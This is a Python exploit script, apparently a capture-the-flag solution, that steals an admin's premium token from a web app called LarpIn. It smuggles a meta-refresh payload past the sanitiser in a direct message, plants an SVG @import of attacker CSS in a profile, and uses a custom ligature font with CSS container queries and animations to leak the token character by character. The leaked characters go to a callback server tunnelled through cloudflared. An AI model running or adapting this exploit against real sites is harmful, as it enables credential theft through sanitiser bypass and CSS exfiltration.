#!/usr/bin/env python3
"""
LarpIn: read the ADMIN's premium token out of a <script> element using only
CSS, one character per bot visit.

Primitive stack (all verified in real headless Chrome, see NOTES.md):
  * DM the admin a sanitiser-bypassing <meta refresh> to /profile/<us>
  * our profile About survives DOMPurify as <svg><style>@import url(OUR)</style></svg>
  * OUR stylesheet defines a data: TTF whose glyph advances we choose, with an
    OpenType ligature per candidate character; only the true next character
    can match, and its ligature advance width identifies it
  * container-type:scroll-state + @container scroll-state(scrollable: right)
    turns "is the element wider than its box" into a background-image fetch
  * a @keyframes sweep of the container width, in lockstep with a registered
    <image> custom property, reads the width off in one page load

Run:  venv/bin/python solve/exfil.py
"""
import http.server
import json
import os
import random
import re
import string
import subprocess
import sys
import threading
import time
import urllib.parse

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "scratch"))
import mkfont  # noqa: E402
from lc import Client  # noqa: E402

PORT = int(os.environ.get("EXPORT", "8890"))
ADMIN_ID = "1"
ADMIN_JOB = os.environ.get("JOB", "1")
PASSWORD = "Passw0rd!23"

# candidate alphabet, ordered; index -> width bucket
CANDS = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-")
STEP = 600          # font units per bucket (uint16 advance, keep n*STEP < 65535)
FS = 16             # px
LEAD = 2.0          # s of lead-in so the data: font is definitely applied
FRAME = 0.10        # s per sweep frame
MAXLEN = 64

CFG_SEL = "script:not([src]):not([type])"     # the inline __USER_CONFIG__ script
TOK_SEL = "script#viewer-premium-token"
CFG_PREFIX = 'premiumToken: "'

STATE = {"hits": {}, "css": {}, "log": []}
LOCK = threading.Lock()


# --------------------------------------------------------------------------- css
def sweep_css(cb, tag, sel, ttf, nbuckets, extra_sel_css=""):
    """Animate `sel`'s width down through nbuckets+1 thresholds; report the
    first threshold at which the element overflows."""
    upx = STEP * FS / 1000.0
    frames = nbuckets + 1
    total = LEAD + FRAME * frames
    w0 = (nbuckets + 1.5) * upx
    segw = ["0%%,%.5f%%{width:%.3fpx}" % (100.0 * LEAD / total - 0.0005, w0)]
    segu = ['0%%,%.5f%%{--u:url("data:,")}' % (100.0 * LEAD / total - 0.0005)]
    for j in range(frames):
        a = 100.0 * (LEAD + FRAME * j) / total
        b = 100.0 * (LEAD + FRAME * (j + 1)) / total - 0.0005
        w = max((nbuckets - j + 0.5) * upx, 1.5)
        segw.append("%.5f%%,%.5f%%{width:%.3fpx}" % (a, b, w))
        segu.append('%.5f%%,%.5f%%{--u:url("%s/h/%s/%d")}' % (a, b, cb, tag, j))
    return """@property --u{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@font-face{font-family:G%(tag)s;src:url(%(font)s)}
@keyframes w%(tag)s{%(segw)s}
@keyframes u%(tag)s{%(segu)s}
%(sel)s{display:block!important;font-family:G%(tag)s!important;font-size:%(fs)dpx!important;
line-height:%(fs)dpx!important;white-space:pre!important;overflow-x:auto!important;
overflow-y:hidden!important;height:%(h)dpx!important;
container-type:scroll-state!important;color:transparent!important;
animation:w%(tag)s %(total).2fs steps(1,end) 1 both!important}
%(sel)s::after{content:""!important;display:block!important;width:1px!important;
height:1px!important;background-image:none;
animation:u%(tag)s %(total).2fs steps(1,end) 1 both!important}
@container scroll-state(scrollable: right){%(sel)s::after{background-image:var(--u)}}
%(extra)s""" % {"tag": tag, "font": mkfont.data_uri(ttf), "segw": "".join(segw),
                "segu": "".join(segu), "sel": sel, "fs": FS, "h": FS * 3,
                "total": total, "extra": extra_sel_css}


def tick_css(cb, tag, nframes):
    """Unconditional coarse clock, to measure how long the bot stayed."""
    total = LEAD + FRAME * nframes
    seg = []
    n = 12
    for j in range(n):
        a = 100.0 * j / n
        b = 100.0 * (j + 1) / n - 0.0005
        seg.append('%.5f%%,%.5f%%{--v:url("%s/k/%s/%d")}' % (a, b, cb, tag, j))
    return """@property --v{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@keyframes k%(tag)s{%(seg)s}
html{background-image:url("%(cb)s/k/%(tag)s/ready")}
body::before{content:""!important;display:block!important;width:2px!important;
height:2px!important;background-image:var(--v);
animation:k%(tag)s %(total).2fs steps(1,end) 1 both!important}
""" % {"tag": tag, "seg": "".join(seg), "cb": cb, "total": total}


def length_css(cb, tag):
    ttf = mkfont.build([], base_width=STEP)
    return sweep_css(cb, tag, TOK_SEL, ttf, MAXLEN) + tick_css(cb, tag, MAXLEN + 1)


def char_css(cb, tag, known):
    if known:
        sel, seqs = TOK_SEL, [known + c for c in CANDS]
    else:
        sel, seqs = CFG_SEL, [CFG_PREFIX + c for c in CANDS]
    ttf = mkfont.build_graded(seqs, step=STEP)
    return sweep_css(cb, tag, sel, ttf, len(CANDS)) + tick_css(cb, tag, len(CANDS) + 1)


# ------------------------------------------------------------------------ server
class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _send(self, body, ctype):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        p = urllib.parse.urlparse(self.path).path
        parts = p.strip("/").split("/")
        if parts[0] in ("h", "k") and len(parts) >= 3:
            with LOCK:
                STATE["hits"].setdefault(parts[1], []).append(
                    (parts[0], parts[2], round(time.time(), 2)))
            return self._send(b"", "image/gif")
        if parts[0] == "c" and len(parts) >= 2:
            tag = parts[1].replace(".css", "")
            with LOCK:
                body = STATE["css"].get(tag, "/*none*/").encode()
            return self._send(body, "text/css")
        self._send(b"ok", "text/plain")


class TS(http.server.ThreadingHTTPServer):
    allow_reuse_address = True
    daemon_threads = True


def start_tunnel(port):
    proc = subprocess.Popen(
        [os.path.expanduser("~/bin/cloudflared"), "tunnel", "--url", "http://127.0.0.1:%d" % port,
         "--no-autoupdate"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    url = None
    t0 = time.time()
    while time.time() - t0 < 60:
        line = proc.stdout.readline()
        if not line:
            break
        m = re.search(r"https://[a-z0-9-]+\.trycloudflare\.com", line)
        if m:
            url = m.group(0)
            break
    threading.Thread(target=lambda: [l for l in proc.stdout], daemon=True).start()
    return proc, url


# ------------------------------------------------------------------------ driver
def newuser(base):
    u = "z" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(9))
    c = Client()
    c.login(u, PASSWORD)
    return c, u


def fire(cb, tag, job=None):
    """Fresh account, About = @import our css, DM the admin a meta refresh to it,
    then apply to a job to wake the reviewer bot."""
    c, u = newuser(None)
    about = '<svg><style>@import url("%s/c/%s.css");</style></svg>' % (cb, tag)
    c.post("/profile/edit", data={"full_name": u, "headline": "SWE", "about": about,
                                  "experience": "x", "education": "x"})
    dm = ('<met<meta zz>a http-equiv=refresh content<meta q>="0;url=/profile/%s">' % u)
    c.post("/messages", data={"receiver_id": ADMIN_ID, "content": dm})
    c.post("/jobs/%s/apply" % (job or ADMIN_JOB),
           data={"cover_letter": "Please review my profile."},
           files={"resume": ("cv.txt", b"hire me", "text/plain")})
    return u


def wait_hits(tag, timeout=110, quiet=6.0):
    t0 = time.time()
    last = None
    while time.time() - t0 < timeout:
        with LOCK:
            hs = list(STATE["hits"].get(tag, []))
        if hs:
            if last is not None and time.time() - max(h[2] for h in hs) > quiet:
                break
            last = len(hs)
        time.sleep(0.5)
    with LOCK:
        return list(STATE["hits"].get(tag, []))


def analyse(hs):
    idx = sorted(int(v) for k, v in [(a, b) for a, b, _ in hs] if k == "h" and v.isdigit())
    ticks = sorted(int(v) for k, v, _ in hs if k == "k" and v.isdigit())
    return idx, ticks


def main():
    srv = TS(("127.0.0.1", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    proc, cb = start_tunnel(PORT)
    if not cb:
        raise SystemExit("no tunnel")
    print("callback:", cb, flush=True)
    time.sleep(4)

    mode = sys.argv[1] if len(sys.argv) > 1 else "len"
    known = os.environ.get("KNOWN", "")

    if mode in ("len", "both"):
        tag = "L%d" % int(time.time())
        with LOCK:
            STATE["css"][tag] = (
                sweep_css(cb, tag, TOK_SEL, mkfont.build([], base_width=STEP), MAXLEN)
                + (sweep_css(cb, tag + "c", CFG_SEL,
                             mkfont.build_graded([CFG_PREFIX + c for c in CANDS], step=STEP),
                             len(CANDS)) if mode == "both" else "")
                + tick_css(cb, tag, MAXLEN + 1))
        u = fire(cb, tag)
        print("fired", tag, "as", u, time.strftime("%H:%M:%S", time.gmtime()), flush=True)
        hs = wait_hits(tag)
        idx, ticks = analyse(hs)
        with LOCK:
            hs2 = list(STATE["hits"].get(tag + "c", []))
        idx2, _ = analyse(hs2)
        print("raw:", hs[:8], "...", len(hs), "hits; cfg hits", idx2[:4], flush=True)
        if idx2:
            k = len(CANDS) - min(idx2)
            print("FIRST CHAR =", repr(CANDS[k]) if 0 <= k < len(CANDS) else ("bucket " + str(min(idx2))), flush=True)
        print("ticks reached:", max(ticks) if ticks else None,
              " (12 == full sweep)", flush=True)
        if idx:
            print("first bucket", min(idx), "-> LENGTH =", MAXLEN - min(idx) + 1, flush=True)
        else:
            print("no width hit", flush=True)
        return

    while True:
        tag = "C%d" % int(time.time())
        with LOCK:
            STATE["css"][tag] = char_css(cb, tag, known)
        u = fire(cb, tag)
        print("[%s] round %d known=%r fired as %s"
              % (time.strftime("%H:%M:%S", time.gmtime()), len(known), known, u), flush=True)
        hs = wait_hits(tag)
        idx, ticks = analyse(hs)
        if not idx:
            print("  no hit (ticks %s). retrying." % (max(ticks) if ticks else None), flush=True)
            continue
        k = len(CANDS) - min(idx)
        if not (0 <= k < len(CANDS)):
            print("  bucket %d out of range, ticks %s" % (min(idx), max(ticks) if ticks else None),
                  flush=True)
            continue
        known += CANDS[k]
        print("  -> %r   TOKEN SO FAR: %s" % (CANDS[k], known), flush=True)
        open(os.path.join(HERE, "token.txt"), "w").write(known)


if __name__ == "__main__":
    main()
